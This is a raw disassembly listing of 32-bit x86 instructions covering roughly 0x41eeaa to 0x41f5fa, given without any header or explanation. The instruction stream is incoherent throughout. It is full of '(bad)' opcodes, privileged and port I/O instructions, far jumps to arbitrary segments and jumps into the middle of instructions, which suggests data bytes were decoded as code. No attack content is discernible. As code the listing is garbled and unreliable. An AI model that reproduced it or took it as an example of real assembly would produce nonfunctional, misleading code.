  41eeaa:	mov    DWORD PTR [eax],esp
  41eeac:	adc    BYTE PTR [eax-0x459a8692],0xdb
  41eeb3:	dec    esp
  41eeb4:	cmp    DWORD PTR [edx],0xf2ed34f5
  41eeba:	and    ch,ah
  41eebc:	adc    ch,BYTE PTR [ebx+0x2726aaf]
  41eec2:	shr    BYTE PTR [ecx+0x7eb1bb7d],0x86
  41eec9:	ficomp DWORD PTR [edi+0x791fec8a]
  41eecf:	sub    DWORD PTR [esi],ecx
  41eed1:	fwait
  41eed2:	imul   BYTE PTR [ebx+0x5247bf75]
  41eed8:	and    cl,BYTE PTR [ebx+0x21]
  41eedb:	fisub  WORD PTR [ecx+0x1357892e]
  41eee1:	imul   ecx,eax,0x6b71b9b7
  41eee7:	jge    0x41eea2
  41eee9:	outs   dx,BYTE PTR ds:[esi]
  41eeea:	jno    0x41ee9c
  41eeec:	fisubr WORD PTR [edx+edx*8-0x9a8a2a7]
  41eef3:	jo     0x41ee7d
  41eef5:	not    BYTE PTR [eax]
  41eef7:	arpl   WORD PTR [esi+0x66],cx
  41eefa:	(bad)  [ebp+esi*1-0x1a]
  41eefe:	cmp    BYTE PTR [eax],al
  41ef00:	or     cl,BYTE PTR ds:0x78d1c020
  41ef06:	fs in  al,0xdb
  41ef09:	arpl   WORD PTR [eax+edx*2],bx
  41ef0c:	repnz cmp DWORD PTR [eax+0x771f0d9d],edi
  41ef13:	loopne 0x41eebb
  41ef15:	fsubr  DWORD PTR [eax-0x11]
  41ef18:	shl    bh,0x56
  41ef1b:	loopne 0x41ef15
  41ef1d:	arpl   WORD PTR [ebx-0x1f],bp
  41ef20:	and    ah,BYTE PTR [edx+0x0]
  41ef23:	push   edx
  41ef24:	imul   esp,DWORD PTR [eax-0x689a31d],0xd0f141d
  41ef2e:	xchg   ebx,eax
  41ef2f:	pop    edi
  41ef30:	mov    fs,eax
  41ef32:	xor    DWORD PTR [edi],ecx
  41ef34:	(bad)  
  41ef35:	dec    ebp
  41ef36:	enter  0x3320,0x6a
  41ef3a:	aas    
  41ef3b:	xor    al,0xf2
  41ef3d:	in     eax,dx
  41ef3e:	mov    ebp,0x5337146b
  41ef43:	mov    edi,ebp
  41ef45:	(bad)  
  41ef46:	out    dx,eax
  41ef47:	(bad)  
  41ef48:	js     0x41ef4e
  41ef4a:	aaa    
  41ef4b:	jmp    0xf4aad6c1
  41ef50:	frstor [edi]
  41ef52:	es inc ebx
  41ef54:	daa    
  41ef55:	sbb    edi,DWORD PTR [eax-0x38]
  41ef58:	fldcw  WORD PTR [ecx-0x2c]
  41ef5b:	pop    edx
  41ef5c:	enter  0xa7b8,0xf8
  41ef60:	push   ss
  41ef61:	ins    DWORD PTR es:[edi],dx
  41ef62:	xchg   DWORD PTR [ebp+0x35],edi
  41ef65:	lods   eax,DWORD PTR ds:[esi]
  41ef66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef67:	mov    ch,BYTE PTR [eax]
  41ef69:	and    ah,cl
  41ef6b:	cli    
  41ef6c:	aad    0x2
  41ef6e:	pusha  
  41ef6f:	dec    ecx
  41ef70:	mov    esi,0x6bd9e08
  41ef75:	push   ebx
  41ef76:	(bad)  
  41ef77:	pop    ecx
  41ef78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef79:	not    BYTE PTR [edx]
  41ef7b:	sbb    bl,BYTE PTR [edx+ebx*1]
  41ef7e:	xchg   esp,eax
  41ef7f:	enter  0x4a5b,0xe6
  41ef83:	sub    ah,dl
  41ef85:	retf   
  41ef86:	jo     0x41f000
  41ef88:	aas    
  41ef89:	call   0x2afa:0xf560337d
  41ef90:	inc    edi
  41ef91:	ja     0x41efbf
  41ef93:	xchg   esi,eax
  41ef94:	push   ds
  41ef95:	loop   0x41ef88
  41ef97:	jo     0x41f018
  41ef99:	dec    ebx
  41ef9a:	(bad)  
  41ef9b:	xlat   BYTE PTR ds:[ebx]
  41ef9c:	fwait
  41ef9d:	test   BYTE PTR [edi+0x1eeae66],dh
  41efa3:	test   eax,0x2c779b90
  41efa8:	dec    esp
  41efa9:	aas    
  41efaa:	jo     0x41ef34
  41efac:	jo     0x41ef68
  41efae:	rcr    BYTE PTR [edx-0x13],cl
  41efb1:	popa   
  41efb2:	add    BYTE PTR [ecx+0xea26dff],0xed
  41efb9:	loop   0x41efb0
  41efbb:	push   ds
  41efbc:	adc    al,BYTE PTR [ecx+0x2b2d634b]
  41efc2:	addr16 (bad) 
  41efc4:	popa   
  41efc5:	sahf   
  41efc6:	shl    BYTE PTR [edi],0x98
  41efc9:	jge    0x41ef94
  41efcb:	ror    DWORD PTR [ecx+0x77bd0f7c],cl
  41efd1:	clc    
  41efd2:	sbb    BYTE PTR [eax-0x197bd2af],0x1a
  41efd9:	push   esi
  41efda:	sar    DWORD PTR [eax-0x27],0x7
  41efde:	jmp    0x7494:0xfa57ba2
  41efe5:	mov    ah,0x28
  41efe7:	push   ds
  41efe8:	adc    eax,0x49a15625
  41efed:	push   esi
  41efee:	dec    edx
  41efef:	ror    DWORD PTR [ebp-0x1551700b],1
  41eff5:	out    dx,eax
  41eff6:	fldcw  WORD PTR [ebp-0x23]
  41eff9:	sbb    ecx,ebx
  41effb:	test   eax,0x2b738b57
  41f000:	fcom   DWORD PTR ds:0x4f3d9154
  41f006:	pop    DWORD PTR [edx+0x5d]
  41f009:	lods   eax,DWORD PTR ds:[esi]
  41f00a:	pop    edi
  41f00b:	ror    BYTE PTR [edx],1
  41f00d:	mov    dl,0x52
  41f00f:	fwait
  41f010:	xor    DWORD PTR [edi+0x52],0xf1264e69
  41f017:	retf   0x697
  41f01a:	cmp    edx,DWORD PTR [esi-0x6285862]
  41f020:	cdq    
  41f021:	loopne 0x41efcd
  41f023:	int    0xe7
  41f025:	fwait
  41f026:	inc    edi
  41f027:	jmp    0x41f035
  41f029:	mov    ecx,0xd03268a3
  41f02e:	jno    0x41f082
  41f030:	push   ebx
  41f031:	call   0x1b22d2f2
  41f036:	rol    ecx,1
  41f038:	inc    eax
  41f039:	pop    eax
  41f03a:	dec    eax
  41f03b:	mov    dl,0x1b
  41f03d:	sub    eax,0x8c9b60
  41f042:	dec    ebp
  41f043:	lahf   
  41f044:	or     esi,0xeae08012
  41f04a:	xchg   esp,eax
  41f04b:	xor    cl,ah
  41f04d:	test   BYTE PTR cs:[edi+0x1c08e05b],bh
  41f054:	mov    ecx,0x35e528af
  41f059:	or     DWORD PTR es:[edi+0x2765d6ff],ecx
  41f060:	push   ebx
  41f061:	(bad)  
  41f062:	nop
  41f063:	test   DWORD PTR [ecx-0x5a],edx
  41f066:	stos   DWORD PTR es:[edi],eax
  41f067:	ins    BYTE PTR es:[edi],dx
  41f068:	sub    ch,al
  41f06a:	lods   eax,DWORD PTR ds:[esi]
  41f06b:	sub    DWORD PTR [edx-0x1a],ebp
  41f06e:	jbe    0x41f082
  41f070:	push   es
  41f071:	(bad)  
  41f072:	xchg   ebp,eax
  41f073:	push   ds
  41f074:	pushf  
  41f075:	not    BYTE PTR [edi]
  41f077:	xor    BYTE PTR [eax+0x6f82a5b2],bl
  41f07d:	and    eax,0x1cd43771
  41f082:	pop    ds
  41f083:	push   cs
  41f084:	popa   
  41f085:	fucomi st,st(1)
  41f087:	and    esp,DWORD PTR [ebp-0x46]
  41f08a:	fnstcw WORD PTR [edx]
  41f08c:	push   ebx
  41f08d:	adc    DWORD PTR [esi+0x3b8197c1],0xffffff8d
  41f094:	leave  
  41f095:	cmp    eax,0x7ea15d06
  41f09a:	push   0xba3882d2
  41f09f:	pop    edi
  41f0a0:	inc    ecx
  41f0a1:	lds    edx,FWORD PTR [ecx+0x68]
  41f0a4:	xchg   ecx,eax
  41f0a5:	mov    BYTE PTR [edi+0x22],dl
  41f0a8:	and    edx,DWORD PTR [eax]
  41f0aa:	dec    ecx
  41f0ab:	lahf   
  41f0ac:	icebp  
  41f0ad:	mov    al,0x8a
  41f0af:	jo     0x41f057
  41f0b1:	mov    ch,0x7e
  41f0b3:	mov    al,ds:0x4475cb5
  41f0b8:	fwait
  41f0b9:	add    ah,BYTE PTR [ebx-0x26622067]
  41f0bf:	sbb    al,0x52
  41f0c1:	leave  
  41f0c2:	xor    eax,0xc1abd881
  41f0c7:	icebp  
  41f0c8:	pop    ds
  41f0c9:	loop   0x41f137
  41f0cb:	mov    ch,0x6a
  41f0cd:	xor    al,0xc5
  41f0cf:	mov    eax,DWORD PTR [eax]
  41f0d1:	xlat   BYTE PTR ds:[ebx]
  41f0d2:	shr    DWORD PTR [ecx+0x59af2305],cl
  41f0d8:	test   al,0x2
  41f0da:	dec    ebx
  41f0db:	jmp    0x6045:0x10996c1d
  41f0e2:	bound  ebp,QWORD PTR [ecx]
  41f0e4:	mov    WORD PTR [ecx+0x1150aa29],fs
  41f0ea:	adc    al,ch
  41f0ec:	xchg   ebp,eax
  41f0ed:	ins    DWORD PTR es:[edi],dx
  41f0ee:	mov    bl,0x44
  41f0f0:	je     0x41f11d
  41f0f2:	or     DWORD PTR [edi+0x41],edx
  41f0f5:	xchg   esp,eax
  41f0f6:	and    bh,BYTE PTR [ebp-0x5e487dcd]
  41f0fc:	pop    edi
  41f0fd:	das    
  41f0fe:	loop   0x41f0b8
  41f100:	push   edi
  41f101:	sub    ch,BYTE PTR [ecx-0x7c]
  41f104:	or     DWORD PTR [ebx-0x1a],edx
  41f107:	cwde   
  41f108:	mov    WORD PTR [ecx],es
  41f10a:	imul   ebx,DWORD PTR ds:0xe4b9dae7,0x34
  41f111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f112:	bswap  edi
  41f114:	pop    edi
  41f115:	jbe    0x41f0f1
  41f117:	shl    DWORD PTR [edx+0x3e137bda],cl
  41f11d:	(bad)  
  41f11e:	stc    
  41f11f:	loop   0x41f144
  41f121:	clc    
  41f122:	xchg   ebp,eax
  41f123:	add    ch,al
  41f125:	hlt    
  41f126:	int3   
  41f127:	sbb    al,0xa2
  41f129:	jae    0x41f0b4
  41f12b:	dec    edi
  41f12c:	loop   0x41f151
  41f12e:	sub    dl,bl
  41f130:	mov    ah,0xdf
  41f132:	adc    eax,0xe0c4a7e7
  41f137:	ins    DWORD PTR es:[edi],dx
  41f138:	cld    
  41f139:	dec    ebx
  41f13a:	xchg   esp,eax
  41f13b:	(bad)  
  41f13c:	cmp    edi,esp
  41f13e:	sub    al,0x1f
  41f140:	push   cs
  41f141:	(bad)  
  41f142:	mov    ch,dh
  41f144:	push   esi
  41f145:	sub    DWORD PTR [edi+0x49754d01],esp
  41f14b:	lods   al,BYTE PTR gs:[esi]
  41f14d:	xchg   ecx,eax
  41f14e:	les    edx,FWORD PTR [eax-0x8614cd4]
  41f154:	and    eax,0x827146cb
  41f159:	imul   edx,DWORD PTR [esi+0x57],0xc00a4a82
  41f160:	dec    ebp
  41f161:	sbb    DWORD PTR [ecx],ecx
  41f163:	mov    cl,0xa0
  41f165:	fld    st(6)
  41f167:	outs   dx,BYTE PTR ds:[esi]
  41f168:	xchg   esp,eax
  41f169:	jno    0x41f118
  41f16b:	jg     0x41f1bb
  41f16d:	fsubr  st,st(3)
  41f16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f170:	mov    ecx,0x9d559a8c
  41f175:	test   BYTE PTR ds:0x94852b5b,dh
  41f17b:	outs   dx,DWORD PTR ds:[esi]
  41f17c:	sbb    eax,0xcecaede7
  41f181:	add    al,0xef
  41f183:	mov    ss,WORD PTR [eax-0xa64444c]
  41f189:	mov    dh,0x63
  41f18b:	outs   dx,DWORD PTR ds:[esi]
  41f18c:	in     eax,dx
  41f18d:	push   0x10
  41f18f:	adc    BYTE PTR [eax],ah
  41f191:	and    esi,ecx
  41f193:	inc    ecx
  41f194:	int3   
  41f195:	mov    ecx,0xff71db27
  41f19a:	mov    al,ds:0x4cfce27e
  41f19f:	es cmc 
  41f1a1:	lock inc esi
  41f1a3:	xchg   bp,ax
  41f1a5:	ss loop 0x41f1f3
  41f1a8:	lods   al,BYTE PTR ds:[esi]
  41f1a9:	daa    
  41f1aa:	xor    eax,0xf738f14
  41f1af:	fisttp DWORD PTR [ecx+0x57]
  41f1b2:	mov    fs,edx
  41f1b4:	mov    ebp,0x10483cb8
  41f1b9:	sub    al,0x2a
  41f1bb:	loop   0x41f158
  41f1bd:	add    DWORD PTR [ebx],esp
  41f1bf:	push   edx
  41f1c0:	dec    esi
  41f1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c2:	ret    0x8095
  41f1c5:	inc    esp
  41f1c6:	outs   dx,BYTE PTR ds:[esi]
  41f1c7:	inc    ebx
  41f1c8:	dec    esp
  41f1c9:	and    DWORD PTR [eax-0x33],0x61
  41f1cd:	js     0x41f178
  41f1cf:	push   0x78
  41f1d1:	mov    ebp,0xafeaed92
  41f1d6:	aad    0x88
  41f1d8:	mov    ah,BYTE PTR [esp+eax*4-0x2e0deefe]
  41f1df:	int3   
  41f1e0:	mov    BYTE PTR [ecx-0x26adceb2],ah
  41f1e6:	sbb    BYTE PTR ds:0x8a04dc73,dl
  41f1ec:	lods   eax,DWORD PTR ds:[esi]
  41f1ed:	mov    esp,0x9f16a044
  41f1f2:	test   eax,0xa4ea3352
  41f1f7:	(bad)  
  41f1f8:	shl    BYTE PTR [edi-0x1cfce6fb],cl
  41f1fe:	loopne 0x41f232
  41f200:	iret   
  41f201:	jecxz  0x41f185
  41f203:	fsubr  DWORD PTR [edi+esi*4]
  41f206:	retf   
  41f207:	adc    eax,0xfa00a02e
  41f20c:	adc    dh,dl
  41f20e:	ds inc esi
  41f210:	add    eax,0x8412e7e5
  41f215:	jl     0x41f283
  41f217:	fucomi st,st(7)
  41f219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f21a:	fst    DWORD PTR [edi+0x4c]
  41f21d:	enter  0x1f77,0x32
  41f221:	or     bl,BYTE PTR [ebp-0x30]
  41f224:	sub    ch,BYTE PTR [esi-0x70]
  41f227:	sbb    eax,esi
  41f229:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f22b:	mov    bh,0x1a
  41f22d:	jbe    0x41f1c8
  41f22f:	test   eax,0x13335ce2
  41f234:	jae    0x41f1e7
  41f236:	dec    edx
  41f237:	sbb    DWORD PTR [esi-0x7d1fec3a],edx
  41f23d:	pop    esp
  41f23e:	scas   al,BYTE PTR es:[edi]
  41f23f:	mov    ah,0xfb
  41f241:	cld    
  41f242:	sbb    al,0xc1
  41f244:	sub    dh,BYTE PTR [eax]
  41f246:	test   eax,0xcad16169
  41f24b:	scas   al,BYTE PTR es:[edi]
  41f24c:	fs test al,0x3b
  41f24f:	adc    al,ah
  41f251:	dec    edi
  41f252:	add    bl,dl
  41f254:	sub    BYTE PTR [esi-0x649d492e],dl
  41f25a:	add    eax,0x6b2c067f
  41f25f:	push   cs
  41f260:	push   ebx
  41f261:	lahf   
  41f262:	push   cs
  41f263:	addr16 cld 
  41f265:	inc    esp
  41f266:	dec    edi
  41f267:	mul    DWORD PTR [esi-0x31]
  41f26a:	ror    BYTE PTR [edi+0x20],0xaa
  41f26e:	push   cs
  41f26f:	adc    edx,DWORD PTR [eax-0x5d]
  41f272:	out    0x99,eax
  41f274:	and    edi,ebp
  41f276:	daa    
  41f277:	xlat   BYTE PTR ds:[ebx]
  41f278:	ficomp WORD PTR [ecx]
  41f27a:	sahf   
  41f27b:	int    0x10
  41f27d:	dec    ecx
  41f27e:	mov    edx,DWORD PTR [edx]
  41f280:	xor    DWORD PTR [ecx+0x6e259d3d],edi
  41f286:	pop    edi
  41f287:	xchg   ebp,eax
  41f288:	mul    BYTE PTR [ebx]
  41f28a:	xor    DWORD PTR [edi],edx
  41f28c:	sub    eax,0xaff6dddf
  41f291:	push   ebx
  41f292:	mov    BYTE PTR [ecx-0x43adb0ba],dl
  41f298:	fsub   DWORD PTR [ebx+0x0]
  41f29b:	add    BYTE PTR [edi+0x8d68ec5],0x4a
  41f2a2:	arpl   WORD PTR [ebx+eax*4-0x2c],bp
  41f2a6:	add    BYTE PTR [esi+0x38],bh
  41f2a9:	fldpi  
  41f2ab:	add    DWORD PTR [eax],ebp
  41f2ad:	or     eax,0xe0f7f814
  41f2b2:	cmovs  ebp,edi
  41f2b5:	cs cmp eax,esp
  41f2b8:	ja     0x41f2a6
  41f2ba:	loop   0x41f251
  41f2bc:	inc    ebp
  41f2bd:	aam    0x29
  41f2bf:	mov    DWORD PTR [edi+0x25],0xf39b03ff
  41f2c6:	(bad)  
  41f2c7:	ja     0x41f302
  41f2c9:	inc    edi
  41f2ca:	mov    edx,0x9ac2fe9b
  41f2cf:	ret    0xb8c7
  41f2d2:	sbb    dh,ah
  41f2d4:	in     al,0x5a
  41f2d6:	not    BYTE PTR [edi]
  41f2d8:	sbb    DWORD PTR [ecx+ecx*1+0x32],eax
  41f2dc:	fiadd  WORD PTR [esi-0x43]
  41f2df:	and    eax,DWORD PTR [edi+ebx*1]
  41f2e2:	dec    esi
  41f2e3:	sbb    al,0xe
  41f2e5:	or     eax,0x84fd9613
  41f2ea:	enter  0x17f4,0x30
  41f2ee:	cmp    DWORD PTR [ebp-0x70],ebx
  41f2f1:	std    
  41f2f2:	stos   DWORD PTR es:[edi],eax
  41f2f3:	and    edx,DWORD PTR [eax]
  41f2f5:	push   esi
  41f2f6:	mov    dl,0xb6
  41f2f8:	push   ss
  41f2f9:	popa   
  41f2fa:	leave  
  41f2fb:	push   cs
  41f2fc:	loop   0x41f280
  41f2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ff:	js     0x41f2cc
  41f301:	sub    eax,0x1db353c1
  41f306:	jmp    0x41f319
  41f308:	mov    al,0x43
  41f30a:	addr16 xchg ecx,eax
  41f30c:	adc    cl,BYTE PTR [ebp-0x78d775be]
  41f312:	sbb    eax,0x31f5de65
  41f317:	mov    eax,ds:0x4270ebf5
  41f31c:	jecxz  0x41f311
  41f31e:	(bad)  
  41f31f:	in     eax,0xf7
  41f321:	xchg   edx,eax
  41f322:	xlat   BYTE PTR ds:[ebx]
  41f323:	fstp   QWORD PTR [esi]
  41f325:	rcl    BYTE PTR [ebp-0x546b53aa],1
  41f32b:	push   esi
  41f32c:	cmp    ebp,ebx
  41f32e:	dec    ebx
  41f32f:	xor    ah,al
  41f331:	cmp    al,BYTE PTR ds:0x2bc7aa3e
  41f337:	pusha  
  41f338:	sub    eax,DWORD PTR [ebx-0x79e50166]
  41f33e:	test   ecx,ecx
  41f340:	lds    ecx,FWORD PTR [ebp+0x44e40891]
  41f346:	jecxz  0x41f34c
  41f348:	fcom   QWORD PTR [eax-0xdac246b]
  41f34e:	or     DWORD PTR [edi+0x13],esp
  41f351:	clc    
  41f352:	and    al,0x9d
  41f354:	cmp    eax,0xb7775fbc
  41f359:	jmp    0x5413940f
  41f35e:	mov    bl,0x6e
  41f360:	dec    eax
  41f361:	es into 
  41f363:	in     al,dx
  41f364:	inc    edx
  41f365:	icebp  
  41f366:	and    BYTE PTR [edx+0x36],bl
  41f369:	jne    0x41f3e0
  41f36b:	loop   0x41f3b7
  41f36d:	lock fwait
  41f36f:	loop   0x41f2f6
  41f371:	je     0x41f32f
  41f373:	into   
  41f374:	retf   0xe130
  41f377:	mov    bl,BYTE PTR [ecx]
  41f379:	push   esp
  41f37a:	and    edi,DWORD PTR ds:0xcf0dd6f6
  41f380:	xchg   ecx,eax
  41f381:	sti    
  41f382:	test   ah,0x6f
  41f385:	sar    DWORD PTR [edi+0x19c81d8e],cl
  41f38b:	inc    ecx
  41f38c:	sub    ebp,DWORD PTR [esi-0x2a]
  41f38f:	sub    BYTE PTR [edi+0x79],0xa0
  41f393:	mov    ah,0x45
  41f395:	pop    ebx
  41f396:	outs   dx,DWORD PTR ds:[esi]
  41f397:	and    al,0xb6
  41f399:	cmp    edx,DWORD PTR [esp+eiz*4+0x60]
  41f39d:	popa   
  41f39e:	pop    ds
  41f39f:	stos   DWORD PTR es:[edi],eax
  41f3a0:	icebp  
  41f3a1:	jae    0x41f389
  41f3a3:	enter  0x27e6,0x5f
  41f3a7:	fst    st(2)
  41f3a9:	pop    es
  41f3aa:	dec    esi
  41f3ab:	xchg   DWORD PTR [ebx],ebx
  41f3ad:	retf   0xf3ef
  41f3b0:	je     0x41f3b5
  41f3b2:	not    BYTE PTR [edx]
  41f3b4:	pop    ebx
  41f3b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3b6:	aad    0x87
  41f3b8:	aaa    
  41f3b9:	pop    ecx
  41f3ba:	pop    eax
  41f3bb:	mov    dl,0xfb
  41f3bd:	sub    BYTE PTR [ebx-0x5834f946],al
  41f3c3:	int    0xe0
  41f3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c6:	inc    eax
  41f3c7:	push   0xffffff92
  41f3c9:	sub    bh,BYTE PTR [esi-0x60288bbf]
  41f3cf:	mov    ch,0x46
  41f3d1:	jmp    0x93780f7a
  41f3d6:	push   0x23514db0
  41f3db:	or     al,0xd0
  41f3dd:	lock bound ebx,QWORD PTR [edi-0x73530190]
  41f3e4:	jg     0x41f383
  41f3e6:	repnz push eax
  41f3e8:	xchg   ebx,eax
  41f3e9:	cli    
  41f3ea:	test   al,0xf
  41f3ec:	mov    ebp,0x7e6dfdca
  41f3f1:	cmp    BYTE PTR [eax+eax*2],ch
  41f3f4:	mov    eax,0xcb01ebd5
  41f3f9:	mov    ecx,0x951f54b9
  41f3fe:	popf   
  41f3ff:	xchg   ecx,eax
  41f400:	mov    dh,0x81
  41f402:	xchg   esi,eax
  41f403:	add    bh,BYTE PTR [edx]
  41f405:	fidivr WORD PTR [esi+eiz*1]
  41f408:	stos   BYTE PTR es:[edi],al
  41f409:	push   ss
  41f40a:	ins    BYTE PTR es:[edi],dx
  41f40b:	dec    edx
  41f40c:	dec    esp
  41f40d:	mov    eax,ds:0xf85e1723
  41f412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f413:	repz xor ebp,DWORD PTR [edi]
  41f416:	ja     0x41f3c7
  41f418:	shl    BYTE PTR [edx-0x5f],cl
  41f41b:	adc    BYTE PTR [ebx+0x5b8f32e7],bl
  41f421:	or     al,BYTE PTR [edi+0x7d]
  41f424:	ret    
  41f425:	fcmove st,st(7)
  41f427:	fbstp  TBYTE PTR [eax-0xf]
  41f42a:	out    0x39,al
  41f42c:	jmp    0x41f415
  41f42e:	xlat   BYTE PTR ds:[ebx]
  41f42f:	aaa    
  41f430:	das    
  41f431:	or     BYTE PTR [ebx-0x6757417a],ch
  41f437:	jge    0x41f4aa
  41f439:	bound  ecx,QWORD PTR [ebp-0x70]
  41f43c:	hlt    
  41f43d:	push   ebx
  41f43e:	iret   
  41f43f:	sbb    edi,ecx
  41f441:	adc    eax,0x6dd9cc74
  41f446:	mov    ecx,edx
  41f448:	int3   
  41f449:	(bad)  
  41f44a:	mov    esp,0x6983da3f
  41f44f:	cdq    
  41f450:	mov    ebx,0xdd1827dc
  41f455:	in     al,0x3b
  41f457:	add    edi,edi
  41f459:	(bad)  
  41f45b:	xchg   esi,eax
  41f45c:	and    DWORD PTR [ebx],esp
  41f45e:	and    BYTE PTR [ebx+0x3cdc4ccd],cl
  41f464:	arpl   WORD PTR [ecx+0x47b8ba83],dx
  41f46a:	arpl   cx,dx
  41f46c:	jg     0x41f4de
  41f46e:	sbb    dh,dh
  41f470:	cmp    eax,0xdcbf7c15
  41f475:	nop
  41f476:	push   ebx
  41f477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f478:	pop    esp
  41f479:	repnz test DWORD PTR [ebp+0x37],ebx
  41f47d:	mov    esi,0xade33ce3
  41f482:	xchg   BYTE PTR [ebp+0x74],ch
  41f485:	inc    eax
  41f486:	mov    bl,0xe8
  41f488:	int3   
  41f489:	mov    esp,DWORD PTR [eax+0x50]
  41f48c:	addr16 retf 0x2f83
  41f490:	jnp    0x41f4ae
  41f492:	cmp    cl,ah
  41f494:	cdq    
  41f495:	enter  0xc37b,0xae
  41f499:	mov    al,0x70
  41f49b:	sbb    ch,BYTE PTR ds:0x12be54b
  41f4a1:	lahf   
  41f4a2:	(bad)  
  41f4a3:	imul   ecx,edx,0x26
  41f4a6:	pusha  
  41f4a7:	inc    BYTE PTR [esi+esi*1-0x4e]
  41f4ab:	add    edi,eax
  41f4ad:	push   ds
  41f4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4af:	cmp    ecx,esp
  41f4b1:	mov    cl,0x2c
  41f4b3:	jno    0x41f533
  41f4b5:	call   0xe5bd7db2
  41f4ba:	fwait
  41f4bb:	jle    0x41f480
  41f4bd:	mov    ch,0x4e
  41f4bf:	cmp    edi,DWORD PTR [ecx-0x3]
  41f4c2:	(bad)  
  41f4c4:	jmp    0x41f4d2
  41f4c6:	inc    esi
  41f4c7:	cmp    al,0xe8
  41f4c9:	mov    ds:0xeeadd03c,al
  41f4ce:	xor    eax,0x671a3adc
  41f4d3:	stos   BYTE PTR es:[di],al
  41f4d5:	les    ecx,FWORD PTR [ebx-0x66]
  41f4d8:	(bad)  
  41f4d9:	cmp    esp,DWORD PTR [ebx]
  41f4db:	inc    ecx
  41f4dc:	and    ebx,esi
  41f4de:	jg     0x41f46f
  41f4e0:	pop    ebx
  41f4e1:	cdq    
  41f4e2:	cmp    BYTE PTR [edx],ah
  41f4e4:	mov    dh,0x54
  41f4e6:	and    BYTE PTR [edx+0x1f2e8c25],ch
  41f4ec:	and    DWORD PTR [edi-0x51],ecx
  41f4ef:	pushf  
  41f4f0:	(bad)  
  41f4f1:	jb     0x41f54b
  41f4f3:	sbb    eax,DWORD PTR [edi+0x7081dc0c]
  41f4f9:	sbb    al,0xe
  41f4fb:	in     eax,dx
  41f4fc:	lea    eax,[edx-0x60]
  41f4ff:	ss hlt 
  41f501:	dec    esi
  41f502:	test   BYTE PTR [edx-0x16],dh
  41f505:	inc    esp
  41f506:	imul   BYTE PTR [ebx-0x20908e13]
  41f50c:	jl     0x41f51d
  41f50e:	xor    eax,0xb7f25e48
  41f513:	fld    DWORD PTR [ecx]
  41f515:	inc    ecx
  41f516:	jge    0x41f510
  41f518:	mov    ebp,0x4e923624
  41f51d:	fidivr WORD PTR [ebp+0x7c]
  41f520:	enter  0x865c,0x22
  41f524:	mov    bh,0x58
  41f526:	aam    0xf9
  41f528:	xchg   ebp,eax
  41f529:	int    0x8e
  41f52b:	jecxz  0x41f4cd
  41f52d:	inc    ebp
  41f52e:	pop    ecx
  41f52f:	mov    al,ds:0xc007c10f
  41f534:	(bad)  
  41f535:	fisub  DWORD PTR [ebx]
  41f537:	mov    esi,0x4b263a7
  41f53c:	das    
  41f53d:	scas   al,BYTE PTR es:[edi]
  41f53e:	adc    bl,BYTE PTR [ecx+0x66953bb0]
  41f544:	xor    al,0xcd
  41f546:	push   0xffffffb7
  41f548:	shr    DWORD PTR [eax-0xb],cl
  41f54b:	adc    ch,bl
  41f54d:	mov    edx,0x16a52166
  41f552:	fimul  WORD PTR [esi+0x54]
  41f555:	sub    BYTE PTR [esi-0x6e],bh
  41f558:	rcl    BYTE PTR [ebx-0x3c1d68f7],1
  41f55e:	mov    edx,0x200ac7f8
  41f563:	fld    TBYTE PTR [edi+0x2694336]
  41f569:	ret    
  41f56a:	dec    edx
  41f56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f56c:	jnp    0x41f56f
  41f56e:	xor    bh,BYTE PTR [esi]
  41f570:	(bad)  
  41f571:	and    DWORD PTR [eax],edx
  41f573:	test   al,0xa0
  41f575:	(bad)
  41f579:	inc    edi
  41f57a:	jecxz  0x41f5e8
  41f57c:	and    bl,BYTE PTR [esi+0x79]
  41f57f:	xchg   esi,eax
  41f580:	mov    dh,0xe9
  41f582:	ret    0x7a1c
  41f585:	loope  0x41f589
  41f587:	call   0x25f54c88
  41f58c:	mov    ebp,DWORD PTR [ecx+edx*4-0x4543cb71]
  41f593:	pop    ebp
  41f594:	ins    BYTE PTR es:[edi],dx
  41f595:	fcom   DWORD PTR [ebx]
  41f597:	or     BYTE PTR [ebx-0x14],ah
  41f59a:	das    
  41f59b:	out    dx,eax
  41f59c:	js     0x41f553
  41f59e:	add    eax,0xd5b4322e
  41f5a3:	sar    BYTE PTR [esi],0x1e
  41f5a6:	xchg   ebx,eax
  41f5a7:	and    bh,cl
  41f5a9:	pop    esp
  41f5aa:	and    al,0xaf
  41f5ac:	or     bl,BYTE PTR [eax+0x58961579]
  41f5b2:	ret    0x129b
  41f5b5:	mov    ebp,0x91c7acbc
  41f5ba:	in     eax,dx
  41f5bb:	lods   eax,DWORD PTR ds:[esi]
  41f5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5bd:	mov    ds:0x19149e4a,al
  41f5c2:	in     eax,dx
  41f5c3:	dec    edx
  41f5c4:	jmp    0x5cc9:0xfc0c7804
  41f5cb:	add    eax,0xcd0fc23f
  41f5d0:	cmp    BYTE PTR [ecx-0x325c7fdc],cl
  41f5d6:	adc    esp,DWORD PTR [ecx-0x10e7e62b]
  41f5dc:	pop    es
  41f5dd:	xor    eax,0xd6ce53af
  41f5e2:	hlt    
  41f5e3:	dec    edx
  41f5e4:	adc    ecx,DWORD PTR [ebx]
  41f5e6:	mov    bl,0x4b
  41f5e8:	xchg   esp,eax
  41f5e9:	(bad)  
  41f5ea:	mov    es,WORD PTR [edi+0x6712af31]
  41f5f0:	imul   esp,DWORD PTR [ebp-0x7c],0xffffff8c
  41f5f4:	mov    eax,0xbcdf1dcb
  41f5f9:	dec    ebp
  41f5fa:	xchg   DWORD PTR [ebp-0x46],edi
